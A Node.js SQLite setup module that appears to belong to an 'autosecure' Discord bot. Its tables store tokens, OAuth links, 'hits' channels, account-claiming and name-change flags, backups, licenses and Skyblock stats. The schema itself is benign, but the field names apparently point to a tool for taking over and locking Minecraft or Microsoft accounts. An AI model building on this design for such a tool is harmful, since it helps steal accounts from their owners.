const sqlite = require("sqlite3").verbose();
const { join } = require("path");
const path = join(__dirname, "database.db");

// Connect to database
const db = new sqlite.Database(path, (err) => {
  if (err) throw err;
});

const queryParams = (command, params, method = "all") => {
  return new Promise((resolve, reject) => {
    db[method](command, params, (error, result) => {
      if (error) {
        reject(error);
      } else {
        resolve(result, this);
      }
    });
  });
};

// Any object that get added to queries will get run automatically upon starting the server

let queries = {
  licenses: `CREATE TABLE IF NOT EXISTS licenses(license TEXT UNIQUE)`,


  autosecure: `
  CREATE TABLE if not exists autosecure(
    id INTEGER PRIMARY KEY,
    server_id TEXT,
    user_id TEXT UNIQUE,
    token TEXT,
    auto_secure NUMBER DEFAULT 1,
    change_ign NUMBER DEFAULT 0,
    multiplayer NUMBER DEFAULT 0,
    oauthapps NUMBER DEFAULT 0,
    oauth_link TEXT,
    logs_channel TEXT,
    notification_channel TEXT,
    hits_channel TEXT,
    status TEXT,
    claiming NUMBER DEFAULT 1,
    backup TEXT UNIQUE,
    autosecureEnabled NUMBER DEFAULT 1,
    claimingresult TEXT DEFAULT "full",
    domain TEXT DEFAULT "oldward.fun",
    secureifnomc NUMBER DEFAULT 1
    )`,
  profiles: `CREATE TABLE IF NOT EXISTS profiles(id INTEGER PRIMARY KEY, user_id TEXT,embed TEXT)`,
  Embeds: `
  CREATE TABLE IF NOT EXISTS embeds(
    user_id TEXT,
    type TEXT,
    embed TEXT
    )`,
  Modals: `CREATE TABLE IF NOT EXISTS modals(
    user_id TEXT,
    type TEXT,
    modal TEXT
  )`,
  Buttons: `CREATE TABLE IF NOT EXISTS buttons(
    user_id TEXT,
    type TEXT,
    button TEXT
  )`,
  autosecureUsers: `
  CREATE TABLE IF NOT EXISTS users(
    id INTEGER PRIMARY KEY,
    user_id TEXT,
    child TEXT,
    claiming NUMBER DEFAULT 1,
    admin NUMBER DEFAULT 0,
    current_profile NUMBER DEFAULT 0
    )`,

  actions: `CREATE TABLE IF NOT EXISTS actions(id INTEGER KEY,action TEXT)`,
  sbStats: `CREATE TABLE IF NOT EXISTS skyblock_stats(id TEXT UNIQUE,data TEXT)`,
};

async function initializeDB() {
  if (db) {
    for (let query of Object.values(queries)) {
      try {
        await db.run(query, [], (err) => {
          if (err) return console.log(err.message);
        });
      } catch (err) {
        return console.error(err);
      }
    }
  } else {
    console.log(`You need to connect to the database first`);
  }
}

module.exports = { initializeDB, queryParams };
